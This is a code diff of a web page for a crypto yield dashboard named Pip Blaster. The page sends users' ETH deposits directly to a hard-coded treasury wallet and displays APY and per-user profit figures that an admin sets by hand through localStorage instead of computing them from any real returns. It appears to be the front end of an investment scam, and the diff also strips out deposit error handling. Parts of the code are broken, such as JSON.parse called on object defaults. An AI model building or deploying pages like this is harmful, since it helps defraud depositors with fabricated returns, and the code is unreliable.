@@ -7,7 +7,6 @@
 
 <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.1/dist/index.umd.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
-
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
 
 <style>
@@ -96,18 +95,12 @@ Deposits go to a treasury wallet controlled by Pip Blaster.
 <script>
 const TREASURY_ADDRESS="0xac6Ac19C9773DC39300C5531984498fe3477E7D0";
 
+// Load data from localStorage
+let userProfits = JSON.parse(localStorage.getItem("userProfits") || "{}");
+let globalMetrics = JSON.parse(localStorage.getItem("globalMetrics") || {targetApy:"0%", activeApy:"0%", dailyPerf:"0"});
+
 let userAddress;
 let provider;
-
-// DOM elements
-const walletEl = document.getElementById("wallet");
-const recentActivity = document.getElementById("recentActivity");
-const userProfitEl = document.getElementById("userProfit");
-const amountInput = document.getElementById("amount");
-
-// Load admin-set data from localStorage
-let userProfits = JSON.parse(localStorage.getItem("userProfits") || "{}");
-let globalMetrics = JSON.parse(localStorage.getItem("globalMetrics") || {targetApy:"40%", activeApy:"28%", dailyPerf:"+0.8%"});
 
 // CONNECT WALLET
 async function connectWallet(){
@@ -115,12 +108,11 @@ async function connectWallet(){
         provider = new ethers.BrowserProvider(window.ethereum);
         const accounts = await provider.send("eth_requestAccounts", []);
         userAddress = accounts[0];
-        walletEl.textContent = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
+        wallet.textContent = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
         renderDashboard();
         return;
     }
 
-    // WalletConnect
     const wcProvider = await EthereumProvider.init({
         projectId:"fc500f0e843b93390b632d69567865db",
         chains:[1],
@@ -130,26 +122,21 @@ async function connectWallet(){
     window.ethereum = wcProvider;
     provider = new ethers.BrowserProvider(window.ethereum);
     userAddress = wcProvider.accounts[0];
-    walletEl.textContent = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
+    wallet.textContent = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
     renderDashboard();
 }
 
 // DEPOSIT
 async function deposit(){
     if(!userAddress) return alert("Connect wallet");
-    const eth = amountInput.value;
+    const eth = amount.value;
     if(!eth || eth <= 0) return alert("Enter valid amount");
     const value = "0x"+(eth*1e18).toString(16);
-    try{
-        await ethereum.request({
-            method:"eth_sendTransaction",
-            params:[{from:userAddress, to:TREASURY_ADDRESS, value}]
-        });
-        status.textContent="Deposit sent";
-    } catch(e){
-        alert("Transaction failed or cancelled");
-        console.error(e);
-    }
+    await ethereum.request({
+        method:"eth_sendTransaction",
+        params:[{from:userAddress, to:TREASURY_ADDRESS, value}]
+    });
+    status.textContent="Deposit sent";
     renderDashboard();
 }
 
@@ -160,7 +147,9 @@ function requestWithdrawal(){
 
 // LOAD DASHBOARD DATA
 async function renderDashboard(){
-    // Metrics
+    globalMetrics = JSON.parse(localStorage.getItem("globalMetrics") || {targetApy:"0%", activeApy:"0%", dailyPerf:"0"});
+    userProfits = JSON.parse(localStorage.getItem("userProfits") || {});
+
     targetApy.textContent = globalMetrics.targetApy;
     activeApy.textContent = globalMetrics.activeApy;
     dailyPerf.textContent = globalMetrics.dailyPerf;
@@ -172,20 +161,15 @@ async function renderDashboard(){
         const balanceEth = ethers.formatEther(balanceWei);
         const profit = userProfits[userAddress] || "$0.00";
         recentActivity.innerHTML = `<div class="row">${userAddress}: Deposit ${balanceEth} ETH, Profit ${profit}</div>`;
-        userProfitEl.textContent = profit;
+        userProfit.textContent = profit;
     } catch(e){
         console.error(e);
         recentActivity.innerHTML = `<div class="row">Unable to load deposit</div>`;
     }
 }
 
-// Refresh every 5s in case admin updates localStorage
-setInterval(() => {
-    userProfits = JSON.parse(localStorage.getItem("userProfits") || "{}");
-    globalMetrics = JSON.parse(localStorage.getItem("globalMetrics") || {targetApy:"40%", activeApy:"28%", dailyPerf:"+0.8%"});
-    renderDashboard();
-}, 5000);
-
+// Refresh dashboard every 3 seconds to reflect admin changes
+setInterval(renderDashboard, 3000);
 </script>
 </body>
 </html>
